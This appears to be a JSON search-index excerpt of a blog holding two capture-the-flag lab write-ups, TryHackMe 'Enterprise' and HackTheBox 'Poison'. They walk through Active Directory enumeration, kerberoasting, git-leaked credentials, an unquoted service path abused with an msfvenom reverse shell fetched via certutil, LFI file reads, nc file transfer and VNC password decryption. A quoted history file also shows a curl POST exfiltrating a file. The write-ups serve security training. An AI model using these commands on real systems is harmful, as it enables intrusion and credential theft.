id=\"description\"\u003eDescription\u003c/h3\u003e\n\u003cp\u003e\u003ca href=\"https://tryhackme.com/r/room/enterprise\"\u003eEnterprise\u003c/a\u003e is a Hard difficulty Active Directory box on Tryhackme. We are in an assumed compromise scenario where our only target is a domain controller on the internal network. While privilege escalation was straightforward, there are multiple rabbit holes for initial access.\u003c/p\u003e","tags":["Active Directory","Git","Kerberoast","THM","Unqoted Service Path","Windows"],"text":"\ndescription enterprise is a hard difficulty active directory box on tryhackme. we are in an assumed compromise scenario where our only target is a domain controller on the internal network. while privilege escalation was straightforward, there are multiple rabbit holes for initial access.\nrecon i began my recon on the machine was a nmap scan.\n# nmap 7.94svn scan initiated wed sep 18 17:50:36 2024 as: nmap -p- -a -v -on nmap.scan -t5 10.10.62.141 increasing send delay for 10.10.62.141 from 0 to 5 due to 948 out of 2369 dropped probes since last increase. warning: 10.10.62.141 giving up on port because retransmission cap hit (2). nmap scan report for 10.10.62.141 host is up (0.21s latency). not shown: 65506 closed tcp ports (reset) port state service version 53/tcp open domain simple dns plus 80/tcp open http microsoft iis httpd 10.0 |_http-title: site doesn\u0026#39;t have a title (text/html). |_http-server-header: microsoft-iis/10.0 | http-methods: | supported methods: options trace get head post |_ potentially risky methods: trace 88/tcp open kerberos-sec microsoft windows kerberos (server time: 2024-09-18 18:02:39z) 135/tcp open msrpc microsoft windows rpc 139/tcp open netbios-ssn microsoft windows netbios-ssn 389/tcp open ldap microsoft windows active directory ldap (domain: enterprise.thm0., site: default-first-site-name) 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http microsoft windows rpc over http 1.0 636/tcp open tcpwrapped 3268/tcp open ldap microsoft windows active directory ldap (domain: enterprise.thm0., site: default-first-site-name) 3269/tcp open tcpwrapped 3389/tcp open ms-wbt-server microsoft terminal services | ssl-cert: subject: commonname=lab-dc.lab.enterprise.thm | issuer: commonname=lab-dc.lab.enterprise.thm | public key type: rsa | public key bits: 2048 | signature algorithm: sha256withrsaencryption | not valid before: 2024-09-17t17:46:46 | not valid after: 2025-03-19t17:46:46 | md5: 12f5:c3db:b128:72f4:9f89:6a26:be7a:899d |_sha-1: 2022:9e18:d0fb:90a4:ba39:9c9b:ef3c:504f:d485:d8ce | rdp-ntlm-info: | target_name: lab-enterprise | netbios_domain_name: lab-enterprise | netbios_computer_name: lab-dc | dns_domain_name: lab.enterprise.thm | dns_computer_name: lab-dc.lab.enterprise.thm | dns_tree_name: enterprise.thm | product_version: 10.0.17763 |_ system_time: 2024-09-18t18:03:41+00:00 |_ssl-date: 2024-09-18t18:03:49+00:00; +50s from scanner time. 5357/tcp open http microsoft httpapi httpd 2.0 (ssdp/upnp) |_http-title: service unavailable |_http-server-header: microsoft-httpapi/2.0 5985/tcp open http microsoft httpapi httpd 2.0 (ssdp/upnp) |_http-title: not found |_http-server-header: microsoft-httpapi/2.0 7990/tcp open http microsoft iis httpd 10.0 |_http-title: log in to continue - log in with atlassian account |_http-server-header: microsoft-iis/10.0 | http-methods: | supported methods: options trace get head post |_ potentially risky methods: trace 9389/tcp open mc-nmf .net message framing 47001/tcp open http microsoft httpapi httpd 2.0 (ssdp/upnp) |_http-server-header: microsoft-httpapi/2.0 |_http-title: not found 49664/tcp open msrpc microsoft windows rpc 49665/tcp open msrpc microsoft windows rpc 49666/tcp open msrpc microsoft windows rpc 49668/tcp open ncacn_http microsoft windows rpc over http 1.0 49669/tcp open msrpc microsoft windows rpc 49670/tcp open msrpc microsoft windows rpc 49672/tcp open msrpc microsoft windows rpc 49674/tcp open msrpc microsoft windows rpc 49703/tcp open msrpc microsoft windows rpc 49707/tcp open msrpc microsoft windows rpc 49840/tcp open msrpc microsoft windows rpc aggressive os guesses: microsoft windows server 2019 (96%), microsoft windows 10 1709 - 1909 (93%), microsoft windows server 2012 (93%), microsoft windows server 2016 (92%), microsoft windows vista sp1 (92%), microsoft windows longhorn (92%), microsoft windows 10 1709 - 1803 (91%), microsoft windows 10 1809 - 2004 (91%), microsoft windows server 2012 r2 (90%), microsoft windows server 2012 r2 update 1 (90%) no exact os matches for host (test conditions non-ideal). network distance: 4 hops tcp sequence prediction: difficulty=260 (good luck!) ip id sequence generation: busy server or unknown class service info: host: lab-dc; os: windows; cpe: cpe:/o:microsoft:windows host script results: | smb2-security-mode: | 3:1:1: |_ message signing enabled and required |_clock-skew: mean: 49s, deviation: 0s, median: 49s | smb2-time: | date: 2024-09-18t18:03:42 |_ start_date: n/a traceroute (using port 554/tcp) hop rtt address 1 75.99 ms 10.13.0.1 2 ... 3 4 204.26 ms 10.10.62.141 read data files from: /usr/bin/../share/nmap os and service detection performed. please report any incorrect results at https://nmap.org/submit/ . # nmap done at wed sep 18 18:03:05 2024 -- 1 ip address (1 host up) scanned in 749.00 seconds even if we were not told that our target was a domain controller (per the room description), it would quickly become apparent with the discovery of dc-specific ports and services like kerberos on port 88.\nafter identifying open services, i always look for quick wins next. i noticed smb anonymous access was allowed and we have read permission on several shares.\n┌──(kali㉿kali)-[~] └─$ netexec smb 10.10.62.141 -u \u0026#39;anonymous\u0026#39; -p \u0026#39;\u0026#39; --shares smb 10.10.62.141 445 lab-dc [*] windows 10 / server 2019 build 17763 x64 (name:lab-dc) (domain:lab.enterprise.thm) (signing:true) (smbv1:false) smb 10.10.62.141 445 lab-dc [+] lab.enterprise.thm\\anonymous: smb 10.10.62.141 445 lab-dc [*] enumerated shares smb 10.10.62.141 445 lab-dc share permissions remark smb 10.10.62.141 445 lab-dc ----- ----------- ------ smb 10.10.62.141 445 lab-dc admin$ remote admin smb 10.10.62.141 445 lab-dc c$ default share smb 10.10.62.141 445 lab-dc docs read smb 10.10.62.141 445 lab-dc ipc$ read remote ipc smb 10.10.62.141 445 lab-dc netlogon logon server share smb 10.10.62.141 445 lab-dc sysvol logon server share smb 10.10.62.141 445 lab-dc users read users share. do not touch! docs and users in particular appeared worth digging further into. i took a look at docs first.\n┌──(kali㉿kali)-[/tmp] └─$ smbclient //10.10.62.141/docs -u anonymous -n try \u0026#34;help\u0026#34; to get a list of possible commands. smb: \\\u0026gt; ls . d 0 mon mar 15 02:47:35 2021 .. d 0 mon mar 15 02:47:35 2021 rsa-secured-credentials.xlsx a 15360 mon mar 15 02:46:54 2021 rsa-secured-document-pii.docx a 18432 mon mar 15 02:45:24 2021 15587583 blocks of size 4096. 9927627 blocks available smb: \\\u0026gt; there are two files, rsa-secured-credentials.xlsx and rsa-secured-document-pii.docx. these could be huge findings that allow us to breach the domain controller. i transferred the files to my attacker machine. the files were password protected, so i extracted the password hashes with office2john and started cracking them while i continued enumerating the machine (spoiler alert: i couldn\u0026rsquo;t crack any of the hashes).\ni took a look at the users share next. after some digging, i came across a powershell history file for lab_admin in \\lab-admin\\appdata\\roaming\\microsoft\\windows\\powershell\\psreadline\\.\nsmb: \\lab-admin\\appdata\\roaming\\microsoft\\windows\\powershell\\psreadline\\\u0026gt; get consolehost_hisory.txt getting file \\lab-admin\\appdata\\roaming\\microsoft\\windows\\powershell\\psreadline\\consolehost_hisory.txt of size 424 as consolehost_hisory.txt (0.4 kilobytes/sec) (average 0.4 kilobytes/sec) ┌──(kali㉿kali)-[/tmp] └─$ cat consolehost_hisory.txt cd c:\\ mkdir monkey cd monkey cd .. cd .. cd .. cd d: cd d: cd d: d:\\ mkdir temp cd temp echo \u0026#34;replication:101repadmin123!!\u0026#34;\u0026gt;private.txt invoke-webrequest -uri http://1.215.10.99/payment-details.txt more payment-details.txt curl -x post -h \u0026#39;cotent-type: ascii/text\u0026#39; -d .\\private.txt\u0026#39; http://1.215.10.99/dropper.php?file=itsdone.txt del private.txt del payment-details.txt cd .. del temp cd c:\\ c:\\ exit we see the credentials replication:101repadmin123!!. i tried using the credentials. unfortunately, it appears that the replication user has been deleted.\nwe can also brute force usernames by taking advantage of the kdc\u0026rsquo;s prompt for preauthentication for valid usernames (it returns an error if given a nonexistent username). i used kerbrute.\n┌──(kali㉿kali)-[~] └─$ ~/opt/kerbrute/dist/kerbrute_linux_amd64 userenum --dc 10.10.62.141 --domain lab.enterprise.thm /usr/share/seclists/usernames/xato-net-10-million-usernames.txt __ __ __ / /_____ _____/ /_ _______ __/ /____ / //_/ _ \\/ ___/ __ \\/ ___/ / / / __/ _ \\ / ,\u0026lt; / __/ / / /_/ / / / /_/ / /_/ __/ /_/|_|\\___/_/ /_.___/_/ \\__,_/\\__/\\___/ version: dev (9cfb81e) - 09/18/24 - ronnie flathers @ropnop 2024/09/18 17:47:42 \u0026gt; using kdc(s): 2024/09/18 17:47:42 \u0026gt; 10.10.62.141:88 2024/09/18 17:47:47 \u0026gt; [+] valid username: banana@lab.enterprise.thm 2024/09/18 17:47:54 \u0026gt; [+] valid username: guest@lab.enterprise.thm 2024/09/18 17:48:20 \u0026gt; [+] valid username: administrator@lab.enterprise.thm 2024/09/18 17:49:53 \u0026gt; [+] valid username: cake@lab.enterprise.thm 2024/09/18 17:50:51 \u0026gt; [+] valid username: enterprise@lab.enterprise.thm 2024/09/18 17:51:40 \u0026gt; [+] valid username: nik@lab.enterprise.thm 2024/09/18 17:52:34 \u0026gt; [+] valid username: guest@lab.enterprise.thm 2024/09/18 17:52:35 \u0026gt; [+] valid username: administrator@lab.enterprise.thm 2024/09/18 17:57:00 \u0026gt; [+] valid username: banana@lab.enterprise.thm 2024/09/18 17:57:14 \u0026gt; [+] valid username: spooks@lab.enterprise.thm 2024/09/18 17:59:28 \u0026gt; [+] valid username: joiner@lab.enterprise.thm i then tried sprayed 101repadmin123!! against the usernames and variations of it (e.g. 101repadmin123!) against the users to no avail. asreproasting also turned up nothing, so i had to look at other attack vectors.\nthere are also two http services running on ports 80 and 7990 that we can take a look at. while port 80 did not yield anything interesting, there is an atlassian portal on port 7990. the login portal itself appears to be a static and unexploitable webpage, but there is a message mentioning that the org may be moving to github.\ni have to admit, it took me way longer than i would have liked to figure out that there was an actual github page associated with \u0026ldquo;enterprise-thm\u0026rdquo; as opposed to something like a .git folder hidden in a subdirectory.\nthe github page has a single repository that doesn\u0026rsquo;t hold any useful information. however, there is an associated account \u0026ldquo;nik-enterprise-dev\u0026rdquo; which has a repository \u0026ldquo;mgmtscript.ps1\u0026rdquo;. this could prove to be out lucky break.\nfoothold the powershell script takes in a username and password and gets the system information of all computers within an active directory network. while the $username and $userpassword fields are empty, we can see that there has been more than one change pushed to this repository.\nwe can look at the details by cloning the repository.\ngit clone https://github.com/nik-enterprise-dev/mgmtscript.ps1.git i then switched to the repository folder and ran git log. this shows, among others, the commit hash for each push to the repository. we can use these hashes to view changes and previous versions of the repo.\n┌──(kali㉿kali)-[/tmp/mgmtscript.ps1] └─$ git log commit c3c239df75fefbe7563d1d29c963ba1f01e4fe5a (head -\u0026gt; main, origin/main, origin/head) author: nik-enterprise-dev \u0026lt;80557956+nik-enterprise-dev@users.noreply.github.com\u0026gt; date: sat mar 13 20:09:16 2021 -0500 updated things i accidentally added something commit bc40c9f237bfbe7be7181e82bebe7c0087eb7ed8 author: nik-enterprise-dev \u0026lt;80557956+nik-enterprise-dev@users.noreply.github.com\u0026gt; date: sat mar 13 18:57:40 2021 -0500 create systeminfo.ps1 gets system info from each computer on the domain in one of his commits, nik comments that he \u0026ldquo;accidentally added something\u0026rdquo;. we can view the details by supplying the commit hash.\n┌──(kali㉿kali)-[/tmp/mgmtscript.ps1] └─$ git show c3c239df75fefbe7563d1d29c963ba1f01e4fe5a commit c3c239df75fefbe7563d1d29c963ba1f01e4fe5a (head -\u0026gt; main, origin/main, origin/head) author: nik-enterprise-dev \u0026lt;80557956+nik-enterprise-dev@users.noreply.github.com\u0026gt; date: sat mar 13 20:09:16 2021 -0500 updated things i accidentally added something diff --git a/systeminfo.ps1 b/systeminfo.ps1 index bc7ca27..5ae7576 100644 --- a/systeminfo.ps1 +++ b/systeminfo.ps1 @@ -1,6 +1,6 @@ import-module activedirectory -$username = \u0026#39;nik\u0026#39; -$userpassword = \u0026#39;\u0026lt;nik\u0026#39;s password\u0026gt;\u0026#39; +$username = \u0026#39;\u0026#39; +$userpassword = \u0026#39;\u0026#39; $pscreds = convertto-securestring $userpassword -asplaintext -force $computers = new-object -typename \u0026#34;system.collections.arraylist\u0026#34; $computer = $(get-adcomputer -filter * | select-object name) we see that nik had accidentally pushed his credentials and the final commit removed them from the repository. i tried nik:\u0026lt;nik's password\u0026gt; against a number of services, but the account does not have sufficient privileges to gain a foothold through common services like rdp or smb. however, since it is a domain account, we can also perform other attacks such as kerberoasting.\n┌──(kali㉿kali)-[/tmp] └─$ impacket-getuserspns lab.enterprise.thm/nik:\u0026#39;\u0026lt;nik\u0026#39;s password\u0026gt;\u0026#39; -dc-ip 10.10.62.141 -request -outputfile kerberoast.txt impacket v0.12.0.dev1 - copyright 2023 fortra serviceprincipalname name memberof passwordlastset lastlogon delegation -------------------- --------- ----------------------------------------------------------- -------------------------- -------------------------- ---------- http/lab-dc bitbucket cn=sensitive-account,cn=builtin,dc=lab,dc=enterprise,dc=thm 2021-03-12 01:20:01.333272 2021-04-26 15:16:41.570158 [-] ccache file is not found. skipping... we get a hash for bitbucket. now to crack it\u0026hellip;\nhashcat -a 0 kerberoast.txt /usr/share/wordlists/rockyou.txt eventually, it cracks.\nprivilege escalation with the new credentials for the bitbucket service account, i connected to the domain controller through rdp.\nxfreerdp /v:10.10.62.141 /u:bitbucket /p:\u0026lt;bitbucket\u0026#39;s password\u0026gt; /cert-ignore after some enumeration, i found an unquoted service path.\nc:\\users\\bitbucket\u0026gt;wmic service get name,pathname | findstr /i /v \u0026#34;c:\\windows\\\\\u0026#34; | findstr /i /v \u0026#34;\u0026#34;\u0026#34; name pathname atlassianbitbucket c:\\atlassian\\bitbucket\\7.11.1\\bin\\bserv64.exe //rs//atlassianbitbucket atlassianbitbucketelasticsearch c:\\atlassian\\bitbucket\\7.11.1\\elasticsearch\\bin\\elasticsearch-service-x64.exe //rs//atlassianbitbucketelasticsearch lsm netsetupsvc zerotieroneservice c:\\program files (x86)\\zero tier\\zero tier one\\zerotier one.exe unquoted service paths are a vulnerability that arises due to the way windows runs its binaries. say we have a program c:\\users\\public\\my programs\\new program.exe, windows will first try to execute c:\\users\\public\\my.exe followed by c:\\users\\public\\my program.exe, c:\\users\\public\\my program\\new.exe, and finally c:\\users\\public\\my programs\\new program.exe because of the spaces in and the path and lack of enclosing quotes. zerotieroneservice is vulnerable to this type of exploit.\nimportantly, the service binary is owned by nt authority\\system.\nc:\\users\\bitbucket\u0026gt;dir /q \u0026#34;c:\\program files (x86)\\zero tier\\zero tier one\\zerotier one.exe\u0026#34; volume in drive c has no label. volume serial number is 7cd9-a0ae directory of c:\\program files (x86)\\zero tier\\zero tier one 12/05/2014 11:52 am 9,594,056 nt authority\\system zerotier one.exe 1 file(s) 9,594,056 bytes 0 dir(s) 40,566,411,264 bytes free user permissions for c:\\program files (x86)\\zero tier:\nc:\\users\\bitbucket\u0026gt;icacls \u0026#34;c:\\program files (x86)\\zero tier\u0026#34; c:\\program files (x86)\\zero tier builtin\\users:(oi)(ci)(w) nt service\\trustedinstaller:(i)(f) nt service\\trustedinstaller:(i)(ci)(io)(f) nt authority\\system:(i)(f) nt authority\\system:(i)(oi)(ci)(io)(f) builtin\\administrators:(i)(f) builtin\\administrators:(i)(oi)(ci)(io)(f) builtin\\users:(i)(rx) builtin\\users:(i)(oi)(ci)(io)(gr,ge) creator owner:(i)(oi)(ci)(io)(f) application package authority\\all application packages:(i)(rx) application package authority\\all application packages:(i)(oi)(ci)(io)(gr,ge) application package authority\\all restricted application packages:(i)(rx) application package authority\\all restricted application packages:(i)(oi)(ci)(io)(gr,ge) successfully processed 1 files; failed processing 0 files bitbucket, as a member of builtin\\users, has write access to the c:\\program files (x86)\\zero tier directory through builtin\\users. it is therefore possible to write a \u0026ldquo;zero.exe\u0026rdquo; binary have the zerotieroneservice execute it.\nmsfvenom -p windows/x64/shell_reverse_tcp lhost=10.13.48.55 lport=31337 -f exe -o zero.exe now to transfer it to our target\u0026hellip;\npython3 -m http.server 80 c:\\program files (x86)\\zero tier\u0026gt;certutil -urlcache -f http://10.13.48.55/zero.exe zero.exe next, i checked the status of zerotieroneservice.\nc:\\program files (x86)\\zero tier\u0026gt;sc query zerotieroneservice service_name: zerotieroneservice type : 10 win32_own_process state : 1 stopped win32_exit_code : 0 (0x0) service_exit_code : 0 (0x0) checkpoint : 0x0 wait_hint : 0x7d0 the service is not running. all that needs to be done now is to start the service and we should receive a shell as nt authority\\system (don\u0026rsquo;t forget to start a listener first).\nc:\\users\\bitbucket\u0026gt;sc start zerotieroneservice ┌──(kali㉿kali)-[~] └─$ rlwrap nc -nvlp 31337 listening on [any] 31337 ... connect to [10.13.48.55] from (unknown) [10.10.146.30] 49930 microsoft windows [version 10.0.17763.1817] (c) 2018 microsoft corporation. all rights reserved. c:\\windows\\system32\u0026gt;whoami whoami nt authority\\system c:\\windows\\system32\u0026gt; ","title":"Enterprise"},{"date":"2024-09-16","image":"","imageAlt":"","link":"https://ep1cac.github.io/posts/poison/","summary":"\u003cp\u003e\u003cimg src=\"/img/poison/poison.png#center\" alt=\"Poison\"\u003e\u003c/p\u003e\n\u003ch3 id=\"description\"\u003eDescription\u003c/h3\u003e\n\u003cp\u003ePoison is a Medium difficulty FreeBSD box. Exploitation involves gaining a low-privilege shell through a vulnerable webapp and escalating privileges through improperly secured credentials.\u003c/p\u003e","tags":["FreeBSD","HTB","LFI","Port Forwarding","Unix","VNC"],"text":"\ndescription poison is a medium difficulty freebsd box. exploitation involves gaining a low-privilege shell through a vulnerable webapp and escalating privileges through improperly secured credentials.\nrecon we start by running a nmap scan against the target.\n┌──(kali㉿kali)-[~] └─$ sudo nmap -p- -a 10.10.10.84 -t5 starting nmap 7.94svn ( https://nmap.org ) at 2024-09-17 01:19 gmt warning: 10.10.10.84 giving up on port because retransmission cap hit (2). nmap scan report for 10.10.10.84 host is up (0.041s latency). not shown: 45954 filtered tcp ports (no-response), 19579 closed tcp ports (reset) port state service version 22/tcp open ssh openssh 7.2 (freebsd 20161230; protocol 2.0) | ssh-hostkey: | 2048 e3:3b:7d:3c:8f:4b:8c:f9:cd:7f:d2:3a:ce:2d:ff:bb (rsa) | 256 4c:e8:c6:02:bd:fc:83:ff:c9:80:01:54:7d:22:81:72 (ecdsa) |_ 256 0b:8f:d5:71:85:90:13:85:61:8b:eb:34:13:5f:94:3b (ed25519) 80/tcp open http apache httpd 2.4.29 ((freebsd) php/5.6.32) |_http-title: site doesn\u0026#39;t have a title (text/html; charset=utf-8). |_http-server-header: apache/2.4.29 (freebsd) php/5.6.32 aggressive os guesses: freebsd 11.0-release - 12.0-current (97%), freebsd 11.1-stable (97%), freebsd 11.2-release - 11.3 release or 11.2-stable (96%), freebsd 11.3-release (96%), freebsd 11.0-stable (95%), freebsd 11.1-release or 11.2-stable (95%), freebsd 11.1-release (95%), freebsd 11.0-current (94%), freebsd 11.0-release (94%), freebsd 12.0-release - 13.0-current (93%) no exact os matches for host (test conditions non-ideal). network distance: 2 hops service info: os: freebsd; cpe: cpe:/o:freebsd:freebsd traceroute (using port 3306/tcp) hop rtt address 1 40.51 ms 10.10.14.1 2 40.65 ms 10.10.10.84 os and service detection performed. please report any incorrect results at https://nmap.org/submit/ . nmap done: 1 ip address (1 host up) scanned in 120.47 seconds the scan shows that tcp ports 22 and 80 are open. visiting the webpage on port 80, we can see a website with the title \u0026ldquo;temporary website to test local .php scripts\u0026rdquo;.\nthere is a list of files that we can test. i tried listfiles.php. the output was messy, so i used view source to get a cleaner view.\nwe get a directory listing. it appears as if browse.php is executing php files that are passed to it. http wrappers are disabled unfortunately, so we can\u0026rsquo;t get a shell through rfi :(. we could also try other attack vectors like log poisoning (which does give you shell as www-data), but there is an interesting file \u0026ldquo;pwdbackup.txt\u0026rdquo; that we can check out first.\nsuccess! now all we need to do is decode the password. we will need to do this 13 times, as implied by the note from out unsuspecting target. this can be done by passing the password to base64 -d manually, but it\u0026rsquo;s far simpler to use a script. i\u0026rsquo;ve provided one below:\n#!/bin/bash encoded_pass=\u0026#34;vm0wd2qyuxlvwgxwv0d4wflurndvrlpzwkzoaljswjbuvlppv0zkc2jetlhhmk0xvmpks1iyskvubghotvvwvvztcedzv015u2twvqpir2hvvfzwd1zwwnrjrwrutwxksvztdgtxqxbpum5cufdwzdbsbvzhv25saljyulvuvluxu1zadgrgzfzam0jwvmxad1dwwnrnvfjqck1eqjrxa1prwvzkr1nsvlvwm040vgtaa2ntrkdar2hwv0vkvvdxegftmvzhwkzotlzgslrdazffuwpsv01qvlrzvezlyzjosvrswmkkv0donlzhegfzvk5ivwtsvwjxafdwmfzlvlzkwgvhrlrnbey0vji1u2exsxdxbuzeykzwelyyeg9xr0v4y0hkwfzscexvakzpzezkcwpar2dlwvrcwk1gwkhkr0zavms1r1rswmtzvkl5yuzkv01gwkxwbfprv0dwsfjsuk5wbkjzvmpkmgexwnrswhbwymtkrvlycedlvmxyclvstldnrez4vm10nfywmxvuak5hvm1ssfvqrldjd3bqujj0tfzxmdfrmkl4wkhoyvjgslhuv3hlujfsc1dtdfpwa2w1wvvat1ywmuckv2t4v2jgchjwmgrxu0dssgjfnwlsweeyvmpkmflxrxhxbljtv0hcv1ltczfsvmxzvm5kwfjsbdvdbvjit1zktljfwjrwbtewtkzkrwpxbk5qulhov1lxdgfvrmw2umxkamqzqlhza2rpvezkwgrhovjivlp6vji1u2fsslhvbgrvvmxwelrrwlplvtvwt1zwv2eydzfxvlzhcmexwxdnvwnlvjj0nfyyskdjr2hhulzwnfzswkdkr1jgtldotmjttjnwbxbltudjefvyaglsbvjwwvrkb1yxbhjwveztvm14elztehckvg1kr2neqkrivlpjvdfaa2fwwllra3byvmxadlperlpkd3bov0vavflrzg9hrlzzwkzowfjswnhvbxm1yw1relftafzivezqvkvaawpxr1zhv210tmjfwtbwakowvjfvevnrafzirnbwvmpou00xcfhlrmryujfasfdrwldhvkpzuw1gv2eyuxddazvhu2tkaljgbexwrlztcmmxskdjrfpoukd4rvdub3dpvu5uufqwswo=\u0026#34; for i in {1..13} do encoded_pass=$(echo -n \u0026#34;$encoded_pass\u0026#34; | base64 -d) done echo -n \u0026#34;$encoded_pass\u0026#34; after running the script, we get our password charix!2#4%6\u0026amp;8(0.\nfoothold we have a password, but we don\u0026rsquo;t know any users we could potentially authenticate as. recall that the webpage can read files. since we know that the target machine is likely freebsd, a unix-like os, we can try to read the /etc/passwd to find users.\nnotice there are three users: root, toor, and charix that seem interesting. we can spray our password against these accounts via ssh. it is true that charix!2#4%6\u0026amp;8(0 is likely the password for charix, it\u0026rsquo;s still worth checking the other accounts for password reuse.\nand now we can authenticate as charix to the server.\nprivilege escalation now that we have a shell, we can move onto privilege escalation. feel free to grab the user flag, but there is also a secret.zip file that might be interesting. it\u0026rsquo;s password protected though, and i find files easier to investigate when they are on my local machine. so i transferred the zip file to kali.\non kali:\n┌──(kali㉿kali)-[/tmp] └─$ nc -nvlp 8000 \u0026gt; secret.zip listening on [any] 8000 ... on poison:\ncharix@poison:~ % nc -nv 10.10.14.33 8000 \u0026lt; secret.zip connection to 10.10.14.33 8000 port [tcp/*] succeeded! before trying to crack the password, we can test for password reuse by supplying the password we got for charix . it succeeds and we get a secret file that appears to be random binary data. i couldn\u0026rsquo;t figure out its purpose at this point, so i decided to enumerate further. i noticed three tcp ports only accessible from localhost on poison: 25, 5801, and 5901.\ncharix@poison:~ % sockstat -4 user command pid fd proto local address foreign address www httpd 728 4 tcp4 *:80 *:* charix sshd 719 3 tcp4 10.10.10.84:22 10.10.14.33:57270 root sshd 716 3 tcp4 10.10.10.84:22 10.10.14.33:57270 www httpd 704 4 tcp4 *:80 *:* root sendmail 642 3 tcp4 127.0.0.1:25 *:* www httpd 641 4 tcp4 *:80 *:* www httpd 640 4 tcp4 *:80 *:* www httpd 639 4 tcp4 *:80 *:* www httpd 638 4 tcp4 *:80 *:* www httpd 637 4 tcp4 *:80 *:* root httpd 625 4 tcp4 *:80 *:* root sshd 620 4 tcp4 *:22 *:* root xvnc 529 1 tcp4 127.0.0.1:5901 *:* root xvnc 529 3 tcp4 127.0.0.1:5801 *:* root syslogd 390 7 udp4 *:514 *:* i had already checked for any mail-related privesc vectors at this point, so i was more interested in ports 5801 and 5901. however, since they were only accessible by localhost on poison, i had to forward them to my attacker machine.\n# forward port 5801 ssh -n -l 5801:127.0.0.1:5801 charix@10.10.10.84 # forward port 5901 ssh -n -l 5901:127.0.0.1:5901 charix@10.10.10.84 now we can do some more enumeration.\n┌──(kali㉿kali)-[~] └─$ sudo nmap -p5801,5901 127.0.0.1 -sv --script=default starting nmap 7.94svn ( https://nmap.org ) at 2024-09-17 19:27 gmt nmap scan report for localhost (127.0.0.1) host is up (0.000097s latency). port state service version 5801/tcp open http bacula http config 5901/tcp open vnc vnc (protocol 3.8) | vnc-info: | protocol version: 3.8 | security types: | vnc authentication (2) | tight (16) | tight auth subtypes: |_ stdv vncauth_ (2) service detection performed. please report any incorrect results at https://nmap.org/submit/ . nmap done: 1 ip address (1 host up) scanned in 10.83 seconds vnc is running on port 5901. vnc is a system designed to share screens. this means that a user using vnc can interact with\u0026hellip; the vnc password file is usually stored in ~/.vnc/passwd. this path does not exist for charix though, but there was a passwd file that we extracted from secret.zip. we can check if it it indeed a vnc password file by attempting to extract a vnc password:\n┌──(kali㉿kali)-[/tmp] └─$ cat secret | openssl enc -des-cbc -nopad -nosalt -k e84ad660c4721ae0 -iv 0000000000000000 -d vncp@$$! success! now that we are certain we have a vnc password file, we can use it to connect to poison.\n┌──(kali㉿kali)-[/tmp] └─$ vncviewer -passwd secret 127.0.0.1::5901 and with that, we have root on the machine.\n","title":"Poison"}]
}

